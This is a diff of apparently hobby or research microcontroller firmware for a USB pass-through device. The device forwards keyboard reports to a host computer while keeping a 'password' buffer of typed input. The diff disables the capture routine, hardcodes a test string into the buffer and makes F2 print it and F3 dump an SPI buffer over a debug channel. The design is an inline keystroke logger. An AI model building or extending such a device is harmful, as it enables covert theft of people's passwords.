@@ -16,7 +16,7 @@
 //extern var
 uint8_t  led_status = 7;
 uint16_t password[200];
-uint16_t password_size = 0;
+uint16_t password_size = 5;
 
 static THD_WORKING_AREA(waTestHID, 1024);
 
@@ -26,35 +26,28 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
     //get every input
-    static int password_index = 0;
-    char       input          = hid2azerty(report);
-    if(!input) {
-        password[password_index] = (uint16_t)input;
-        if(password_index++ >= 200)
-            password_index = 0;
-        if(password_size++ >= 200)
-            password_size = 200;
-    }
+    //  static int password_index = 0;
+    //  char       input          = hid2azerty(report);
+    //  if(!input) {
+    //      password[password_index] = (uint16_t)input;
+    //      if(password_index++ >= 200)
+    //          password_index = 0;
+    //      if(password_size++ >= 200)
+    //          password_size = 200;
+    //  }
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
         /* send the key on the computer */
         usb_report(&UHD2, report, 8);
+
+        //print password
         if(report[2] == KEY_F2) {
-            static uint16_t msg1 = 0x0500;
-            spi_write(&msg1, 1);
-        } else if(report[2] == KEY_F3) {
-            const int       n = 100;
-            static uint16_t msg2[100];
-            for(uint16_t i = 0; i < n; i++)
-                msg2[i]    = i;
-            spi_write(msg2, n);
-        } else if(report[2] == KEY_F4) {
-            const int       n = 500;
-            static uint16_t msg3[500];
-            for(uint16_t i = 0; i < n; i++)
-                msg3[i]    = i;
-            spi_write(msg3, n);
-        } else if(report[2] == KEY_F5) {
+            for(int i = 0; i < password_size; i++)
+                rtt_printf("input[%d] = '%c'", i, password[i]);
+        }
+
+        //print spi buffer
+        else if(report[2] == KEY_F3) {
             spi_display_buffer(10);
         }
     }
@@ -102,6 +95,11 @@ static void ThreadTestHID(void *p)
  */
 void usbh_init(void)
 {
+    password[0] = 'a';
+    password[1] = 'r';
+    password[2] = 'a';
+    password[3] = 't';
+    password[4] = 'i';
     /*USBH_FS OTG*/
     palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
     palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
